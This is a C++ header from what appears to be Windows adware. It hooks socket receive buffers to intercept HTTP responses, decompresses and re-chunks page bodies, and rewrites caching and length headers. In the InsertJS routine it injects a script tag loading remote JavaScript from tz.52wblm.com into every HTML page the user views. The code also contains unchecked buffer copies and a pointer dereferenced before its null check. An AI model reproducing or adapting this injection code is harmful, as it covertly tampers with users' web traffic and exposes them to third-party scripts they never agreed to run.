#pragma once
#include "Utility.h"
#include <vector>

#define INIT_STATUS		0
#define TRANS_STATUS	1

#define AFD_RECV 0x12017
#define AFD_SEND 0x1201f

#define STATUS_SUCCESS		0
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define WM_DATA_REPORT			(WM_APP + 101)
extern HWND g_hWnd;
extern int g_nLastTime;

typedef struct ggShowConfig{
	ggShowConfig(){
		nInterval = 0;
		vLastUrls.clear();
		vBlackUrlList.clear();
	}
	int nInterval;	//广告显示时间间隔，秒
	vector<TString> vBlackUrlList;	//黑名单
	vector<TString> vLastUrls;	//已处理过的Urls，过滤掉同一网站中多余的请求
}_ggShowConfig;

struct AFD_WSABUF
{
	DWORD len;
	PCH buf;
};

struct AFD_INFO
{
	AFD_WSABUF* BufferArray;
	DWORD BufferCount;
	DWORD AfdFlags;
	DWORD TdiFlags;
};

class CStream
{
public:
	CHAR*	m_Buf;
	DWORD	m_BufLen;
	DWORD	m_ValidLen;
	DWORD	m_Offset;
	CStream()
	{
		m_Buf = NULL;
		m_BufLen = 0;
		m_Offset = 0;
		m_ValidLen = 0;
	}

	virtual ~CStream()
	{
		if (m_Buf) {
			delete m_Buf;
			m_Buf = NULL;
		}
	}

	BOOL IsEmpty()
	{
		return ((m_ValidLen == 0)?TRUE:FALSE);
	}

	CHAR* GetBuf()
	{
		return m_Buf + m_Offset;
	}

	BOOL OutputData(CHAR* Buf, DWORD BufLen, ULONG_PTR* OutLen)
	{
		// 计算长度，为长度域保留8个字节[\r\nxxxx\r\n]，最大0xFFFF
		BufLen -= 8;
		CString strLen;
		if (BufLen >= m_ValidLen) {
			*OutLen = m_ValidLen;
			// 添加长度信息
			
			strLen.Format("\r\n%x\r\n", *OutLen);
			memcpy(Buf, strLen, strLen.GetLength());

			memcpy(Buf + strLen.GetLength(), m_Buf + m_Offset, *OutLen);
			m_Offset = 0;
			m_ValidLen = 0;
		} else {
			*OutLen = BufLen;
			strLen.Format("\r\n%x\r\n", *OutLen);
			memcpy(Buf, strLen, strLen.GetLength());
			memcpy(Buf + strLen.GetLength(), m_Buf + m_Offset, *OutLen);
			m_Offset += BufLen;
			m_ValidLen -= BufLen;
		}

		(*OutLen) += strLen.GetLength();

		return TRUE;
	}
};

class CInputStream : public CStream
{
public:
	BOOL	m_isGZip;
	BOOL	m_isChunked;
	int		m_nCurChunkSize;
	int		m_nCurChunkOffset;
	
	CInputStream()
	{
		m_isGZip = FALSE;
		m_isChunked = FALSE;
		m_nCurChunkSize = -1;
		m_nCurChunkOffset = 0;
	}
};

class COutputStream : public CStream
{
public:
	COutputStream()
	{ }
};

class CModifier
{
public:
	HANDLE m_hSocket;
	CInputStream  m_In;
	COutputStream m_Out;
	CUnGZip		  m_UnGZip;
	INT	m_Status;
	BOOL m_bIsInsert;

	CHAR*	m_AppBuf;
	LONG	m_AppBufLen;

	_ggShowConfig* m_pGgShowConfig;

	wchar_t * m_wchar;
	char * m_char;

	CModifier(HANDLE hSocket, _ggShowConfig* pGgShowConfig) :m_hSocket(hSocket), m_pGgShowConfig(pGgShowConfig)
	{
		m_char = NULL;
		m_wchar = NULL;
		m_Status = INIT_STATUS;
		m_bIsInsert = FALSE;
	}

	~CModifier()
	{
		ReleaseChar();
	}

	void ReleaseChar()
	{
		if (m_char)
		{
			delete m_char;
			m_char = NULL;
		}
		if (m_wchar)
		{
			delete m_wchar;
			m_wchar = NULL;
		}
	}

	BOOL LinkToStream(AFD_WSABUF* pBuf, CStream& Stream)
	{
		m_AppBuf = pBuf->buf;
		m_AppBufLen = pBuf->len;

		Stream.m_Offset = 0;
		Stream.m_ValidLen = 0;

		pBuf->buf = Stream.m_Buf;
		pBuf->len = Stream.m_BufLen;

		return TRUE;
	}

	BOOL BrekLinkFormStream(AFD_WSABUF* pBuf)
	{
		pBuf->buf = m_AppBuf;
		pBuf->len = m_AppBufLen;

		return TRUE;
	}

	BOOL DeleteHttpHead(CString& strHead, LPSTR lpszHead)
	{
		INT begin = strHead.Find(lpszHead);
		if (begin == -1) {
			return TRUE;
		}
		INT end = strHead.Find("\r\n", begin);
		if (end == -1) {
			return FALSE;
		}

		strHead.Replace(strHead.Mid(begin, end - begin + 2), "");

		return TRUE;
	}

	BOOL AddHttpHead(CString& strHead, LPSTR lpszHead)
	{
		strHead += "\r\n";
		strHead += lpszHead;

		return TRUE;
	}

	BOOL GetHeadValue(CString& strHead, LPSTR lpszKey, CString& strVal)
	{
		INT begin = strHead.Find(lpszKey);
		if (begin == -1) {
			return FALSE;
		}
		begin += strlen(lpszKey) + 1;
		INT end = strHead.Find("\r\n", begin);
		if (end == -1) {
			strVal = strHead.Mid(begin, strHead.GetLength() - begin);
		}
		else {
			strVal = strHead.Mid(begin, end - begin);
		}
		
		return TRUE;
	}

	BOOL ReleaseData(AFD_WSABUF* pBuf, CStream& Stream, ULONG_PTR* OutLen)
	{
		return Stream.OutputData(pBuf->buf, pBuf->len, OutLen);
	}

	BOOL ParseTansDataPacket(LONG recvLen, NTSTATUS& ntRet)
	{
		if (ntRet == STATUS_SUCCESS && recvLen > 0) {
			m_In.m_ValidLen = recvLen;
			return TRUE;
		}
	
		return FALSE;
	}

	void InsertJS(CStream& Out)
	{
		Out.m_Buf[Out.m_ValidLen] = '\0';
		CHAR* p = strstr(Out.m_Buf, "</body>");
		if (p != NULL) {
			DWORD dTime = GetTickCount();
			dTime /= 1000;
			g_nLastTime = dTime;

			CString str = p;
			str.Insert(0, "<script type='text/javascript' src='http://tz.52wblm.com/51wan.js'></script>\r\n");
			Out.m_ValidLen += strlen("<script type='text/javascript' src='http://tz.52wblm.com/51wan.js'></script>\r\n");
			memcpy(p, str, str.GetLength());

			/*OutputDebugString(TEXT("\n===========Insert JS Title:===========\n"));
			OutputDebugString(m_char);
			OutputDebugString(TEXT("\n===========end===========\n"));*/

			m_bIsInsert = TRUE;
		}
	}
	
	BOOL StreamToStream(CStream& In, CStream& Out)
	{
		if (In.IsEmpty()) {
			return FALSE;
		}

		LONG lInUsed;
		LONG lOutUsed;
		m_UnGZip.xDecompress((BYTE*)In.GetBuf(), In.m_ValidLen, (BYTE*)Out.m_Buf, (Out.m_BufLen - 512), &lInUsed, &lOutUsed);
		In.m_Offset += lInUsed;
		In.m_ValidLen -= lInUsed;

		
		Out.m_ValidLen = lOutUsed;
		InsertJS(Out);
		
		return TRUE;
	}

	void ReparseChunkData()
	{
		char *chTemp = new char[8 * 1024];
		memset(chTemp, 0, (8 * 1024));
		int nInOffset = 0;
		int nTempBufOffset = 0;
		int nInSize = m_In.m_ValidLen;
		BOOL bIsFirstPacket = FALSE;
		while (1)
		{
			if (m_In.m_nCurChunkSize == -1)	{	//如果是第一个包，设置chunk数据块长度
				bIsFirstPacket = TRUE;
				char chChunkSize[8];
				int i;
				for (i = 0; i < 8; i++) {
					if (m_In.m_Buf[i] == '\r') {
						chChunkSize[i] = '\0';
						break;
					}
					chChunkSize[i] = m_In.m_Buf[i];
				}
				int nDelLen = strlen(chChunkSize) + 2;

				m_In.m_nCurChunkSize = strtol(chChunkSize, NULL, 16);
				m_In.m_nCurChunkOffset = 0;
				nInOffset += nDelLen;
				continue;
			}
			int nCurChunkSurplusSize = m_In.m_nCurChunkSize - m_In.m_nCurChunkOffset;
			int nCurInBufSurplusSize = nInSize - nInOffset;
			if (nCurChunkSurplusSize > nCurInBufSurplusSize) {	//如果当前chunk数据剩余长度大于输入buf剩余长度
				m_In.m_nCurChunkOffset += nCurInBufSurplusSize;
				if (bIsFirstPacket || strlen(chTemp) > 0) {
					memcpy((chTemp + nTempBufOffset), (m_In.m_Buf + nInOffset), nCurInBufSurplusSize);
					nTempBufOffset += nCurInBufSurplusSize;
					memset(m_In.m_Buf, 0, (8 * 1024));
					memcpy(m_In.m_Buf, chTemp, nTempBufOffset);
					m_In.m_ValidLen = nTempBufOffset;
				}
				delete[] chTemp;
				break;
			}
			else {
				memcpy((chTemp + nTempBufOffset), (m_In.m_Buf + nInOffset), nCurChunkSurplusSize);
				char chChunkSize[8];
				int nSearchPos = nInOffset + nCurChunkSurplusSize + 2;
				int j = 0;
				for (int i = nSearchPos; i < (nSearchPos + 8); i++) {
					if (m_In.m_Buf[i] == '\r') {
						chChunkSize[j] = '\0';
						break;
					}
					chChunkSize[j] = m_In.m_Buf[i];
					j ++;
				}
				int nDelLen = strlen(chChunkSize) + 4;

				m_In.m_nCurChunkSize = strtol(chChunkSize, NULL, 16);
				nTempBufOffset += nCurChunkSurplusSize;
				if (m_In.m_nCurChunkSize == 0) {
					memset(m_In.m_Buf, 0, (8 * 1024));
					memcpy(m_In.m_Buf, chTemp, nTempBufOffset);
					m_In.m_ValidLen = nTempBufOffset;

					delete[] chTemp;
					break;
				}
				m_In.m_nCurChunkOffset = 0;
				nInOffset += (nCurChunkSurplusSize + nDelLen);
			}
		}

	}

	/*char* CharToWchar(char* c)
	{
		int len = MultiByteToWideChar(CP_ACP, 0, c, strlen(c), NULL, 0);
		char *m_wchar = new wchar_t[len + 1];
		MultiByteToWideChar(CP_ACP, 0, c, strlen(c), m_wchar, len);
		m_wchar[len] = '\0';
		return m_wchar;
	}*/

	void WcharToChar(wchar_t* wc)
	{
		int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, NULL);
		m_char = new char[len + 1];
		WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);
		m_char[len] = '\0';
	}

	void QXUtf82Unicode(const char* utf)
	{
		ReleaseChar();
		if (!utf || !strlen(utf))
		{
			return ;
		}
		int dwUnicodeLen = MultiByteToWideChar(CP_UTF8, 0, utf, -1, NULL, 0);
		size_t num = dwUnicodeLen*sizeof(wchar_t);
		m_wchar = new wchar_t[num];
		memset(m_wchar, 0, num);
		MultiByteToWideChar(CP_UTF8, 0, utf, -1, m_wchar, dwUnicodeLen);

		WcharToChar(m_wchar);
	}

	/*char* QXUnicode2Utf8(const char* unicode)
	{
		int len;
		len = WideCharToMultiByte(CP_UTF8, 0, (const wchar_t*)unicode, -1, NULL, 0, NULL, NULL);
		char *szUtf8 = (char*)malloc(len + 1);
		memset(szUtf8, 0, len + 1);
		WideCharToMultiByte(CP_UTF8, 0, (const wchar_t*)unicode, -1, szUtf8, len, NULL, NULL);
		return szUtf8;
	}*/

	BOOL CheckKeyWords()
	{
		char chTemp[4096];
		char *titleBegin = strstr(m_Out.m_Buf, "<title>");
		titleBegin += 7;
		char *titleEnd = strstr(m_Out.m_Buf, "</title>");
		if (!titleBegin || !titleEnd) {
			return FALSE;
		}
		int len = titleBegin - m_Out.m_Buf;
		memcpy(chTemp, m_Out.m_Buf, len);
		chTemp[len] = '\0';
		int nLen = titleEnd - titleBegin;
		if (strstr(chTemp, "utf-8") || strstr(chTemp, "UTF-8")) {
			char chTitle[256];
			memcpy(chTitle, titleBegin, nLen);
			chTitle[nLen] = '\0';
			QXUtf82Unicode(chTitle);
		} else {
			ReleaseChar();
			m_char = new char[nLen + 1];
			memcpy(m_char, titleBegin, nLen);
			m_char[nLen] = '\0';
		}

		if (!m_char) {
			return FALSE;
		}

		/*for (size_t i = 0; i < m_pGgShowConfig->vKeyWordsList.size(); i++) {
			if (strstr(m_char, m_pGgShowConfig->vKeyWordsList[i].GetBuffer())) {
				return TRUE;
			}
		}*/

		return FALSE;
	}
	
	BOOL ParseFirstDataPacket(AFD_WSABUF* pBuf, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS& ntRet)
	{
		LONG recvLen = IoStatusBlock->Information;
		if (ntRet == STATUS_SUCCESS && recvLen > 16) {
			if (memcmp(pBuf->buf, "HTTP/1.1 302 Moved Temporarily", 25) == 0) {
				m_pGgShowConfig->vLastUrls.erase((m_pGgShowConfig->vLastUrls.end() - 1));
				return FALSE;
			}
			if (memcmp(pBuf->buf, "HTTP/1.1 200 OK", 13) == 0) {
				//m_In.m_ValidLen = recvLen;
				CHAR* p = strstr(pBuf->buf, "\r\n\r\n");
				if (p == NULL) {
					return FALSE;
				}
				*p = '\0';
				CString strHead = pBuf->buf;
				*p = '\r';
				CString strVal;
				if (GetHeadValue(strHead, "Content-Type:", strVal)) {
					if (strVal.Find("text/html") == -1) {
						m_pGgShowConfig->vLastUrls.erase((m_pGgShowConfig->vLastUrls.end() - 1));
						return FALSE;
					}
				}

				if (GetHeadValue(strHead, "Content-Encoding:", strVal)) {
					if (strVal.Find("gzip") != -1) {
						m_In.m_isGZip = TRUE;
					}
				}

				if (GetHeadValue(strHead, "Transfer-Encoding:", strVal)) {
					if (strVal.Find("chunked") != -1) {
						m_In.m_isChunked = TRUE;
					}
				}

				if (m_In.m_isGZip) {
					if (pBuf->len > 8 * 1024) {
						m_In.m_Buf = new CHAR[pBuf->len];
						m_In.m_BufLen = pBuf->len;
					} else {
						m_In.m_Buf = new CHAR[8 * 1024];
						m_In.m_BufLen = 8 * 1024;
					}

					m_Out.m_Buf = new CHAR[32 * 1024];
					m_Out.m_BufLen = 32 * 1024;

					// 将压缩的数据复制到输入流，调整到body的开始
					p += 4;

					m_In.m_ValidLen = recvLen - (p - pBuf->buf);
					memcpy(m_In.m_Buf, p, m_In.m_ValidLen);

					if (m_In.m_isChunked) {
						ReparseChunkData();
					}
					
					// 解压第一个数据包
					LONG lInUsed;
					LONG lOutUsed;
					m_UnGZip.xDecompress((BYTE*)m_In.m_Buf, m_In.m_ValidLen, (BYTE*)m_Out.m_Buf, m_Out.m_BufLen, &lInUsed, &lOutUsed);

					m_In.m_ValidLen -= lInUsed;
					m_Out.m_ValidLen = lOutUsed;

					//匹配关键字
					/*if (!CheckKeyWords())
					{
						return FALSE;
					}*/
					char chTemp[4096];
					char *titleBegin = strstr(m_Out.m_Buf, "<title>");
					titleBegin += 7;
					char *titleEnd = strstr(m_Out.m_Buf, "</title>");
					if (!titleBegin || !titleEnd) {
						return FALSE;
					}

					if (GetHeadValue(strHead, "Cache-Control:", strVal)) {		//设置无缓存
						if (strVal != "max-age=0" && strVal != "no-cache") {
							strHead.Replace(strVal, "max-age=0");
						}
					} else {
						AddHttpHead(strHead, "Cache-Control: max-age=0");
					}
					DeleteHttpHead(strHead, "Expires:");

					// 删除Content-Length:
					DeleteHttpHead(strHead, "Content-Length:");
					DeleteHttpHead(strHead, "Content-Encoding: gzip");
					// 添加Transfer-Encoding: chunked
					if (!m_In.m_isChunked)
					{
						AddHttpHead(strHead, "Transfer-Encoding: chunked");
					}

					// 复制Http头
					strHead += TEXT("\r\n");
					memcpy(pBuf->buf, strHead, strHead.GetLength());
					p = pBuf->buf + strHead.GetLength();

					//有可能会只有一个包
					InsertJS(m_Out);

					ULONG_PTR	lOut;
					m_Out.OutputData(p, pBuf->len - (p - pBuf->buf), &lOut);
					IoStatusBlock->Information = lOut + strHead.GetLength();

					m_Status = TRANS_STATUS;
					return TRUE;
				} else {
					// 没有压缩，修改Content-Length:
					return FALSE;
				}
			}
		
		}

		return FALSE;
	}
};

